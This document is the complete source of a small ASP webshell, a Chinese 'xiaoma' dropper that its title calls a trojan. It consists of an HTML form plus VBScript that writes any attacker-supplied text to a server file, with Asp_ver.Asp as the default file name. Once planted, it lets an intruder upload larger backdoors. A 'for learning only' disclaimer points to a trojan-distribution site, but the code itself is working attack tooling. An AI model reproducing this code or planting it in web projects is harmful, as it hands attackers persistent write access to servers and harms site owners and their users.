<TITLE>Expdoor.com ASP专用小马</TITLE>
<form method="post" action="?action=set">
  <label>文件内容:
  <br />
  <textarea name="Text" cols="50" rows="10" id="Text">填入你想写入的内容</textarea>
  </label><br><font color=red>该脚本仅供学习使用,请勿用于非法!如果发现威胁文件，请到<a

href='http://www.expdoor.com' title="脚本木马发布基地">www.Expdoor.com</a>解除你的危险状况

</font>
  <br />
  <br />
  <label>文件名:
    <input name="FileName" type="text" value="Asp_ver.Asp" size="20" maxlength="50" />
    <br />
    <br />
  </label>
  <label> 
    <input type="submit" name="Submit" value="保存" />
   </label>
</form>
<%
dim s
if request("action")="set" then   
Text=request("Text")              
FileName=request("FileName")      
set fs=server.CreateObject("Scripting.FileSystemObject")   '创建FSO组件
set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '创建FileName指定的文件
file.writeline Text                                        '把TEXT逐行写入到文件中，如果没有写

权限，会造成操作失败
file.close                                                 '关闭file
set file=nothing                                           '释放
set fs=nothing                                             '释放
response.write ("<script>alert('保存成功!')</script>")    '返回到客户端执行提示保存成功
end if
%>